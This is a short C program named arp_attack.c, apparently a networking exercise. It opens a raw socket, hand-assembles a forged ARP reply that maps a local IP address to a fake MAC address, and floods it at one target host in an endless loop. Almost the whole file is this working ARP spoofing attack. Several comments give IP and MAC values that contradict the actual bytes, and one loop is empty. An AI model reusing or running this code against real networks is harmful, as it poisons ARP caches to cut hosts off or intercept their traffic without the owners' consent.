/* ************************************************************************
 *       Filename:  arp_attack.c
 *    Description:  
 *        Version:  1.0
 *        Created:  2013年12月19日 17时27分27秒
 *       Revision:  none
 *       Compiler:  gcc
 *         Author:  YOUR NAME (), 
 *        Company:  
 * ************************************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <fcntl.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>


int sock_raw_fd = 0;
int main(int argc, char *argv[])
{
	//1-----创建通信用的原始套接字------------------------------
	sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sock_raw_fd < 0)
	{
		perror("socket");
		exit(-1);
	}
	
	//2-----根据各种协议首部格式构建发送数据报-------------------
	unsigned char send_msg[1024] = {
		//-------------combination mac------ 0 ~ 13 -----------
		0x00, 0x0c, 0x29, 0x87, 0x41, 0x93,
	//	0x10, 0x78, 0xd2, 0xce, 0x5c, 0x75,	//det_mac: ff:ff:ff:ff:ff:ff
		0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02,	//src_mac: 00:0c:29:4d:0a:02
		0x08, 0x06,							//type: 0x0806 ARP argeement
		
		//-------------combination ARP------ 14 ~ 41 ----------
		0x00, 0x01, 0x08, 0x00,				//hardware_type: 1, agreement_type: 0x0800(IP)
		0x06, 0x04, 0x00, 0x02,				//hardware_length: 6, agreement_length: 4, option:(1:ARP_ask, 2:ARP_answer, 3:RARP_ask, 4:RARP_answer)
		0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	//	0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02,	//send_src_mac: 00:0c:29:4d:0a:02
		10, 220, 4, 13,						//send_src_ip: 10.220.4.32
		0x10, 0x78, 0xd2, 0xce, 0x5c, 0x75,	//target_mac: c8:9c:dc:ba:aa:ca
		10, 220, 4, 14						//target_ip: 10.220.4.31
	};
	
	//3-----数据初始化---------------------------------------------
	struct sockaddr_ll sll;					//barbarism sockfd addr
	struct ifreq ethreq;					//network interface addr
	strncpy(ethreq.ifr_name, "eth0", IFNAMSIZ);//appointed name for network card
	
	//4-----将网络接口赋值给原始套接字地址结构---------------------
	if(-1 == ioctl(sock_raw_fd, SIOCGIFINDEX, (char *)&ethreq))
	{
		perror("ioctl");
		close(sock_raw_fd);
		exit(-1);
	}
	bzero(&sll, sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;
	int i = 0;
	for(i = 1; i < 253; i++)
	{
		
	}
	while(1)
	{
		sendto(sock_raw_fd, send_msg, 42, 0, (struct sockaddr *)&sll, sizeof(sll));
	}
	
	sleep(2);
	return 0;
}
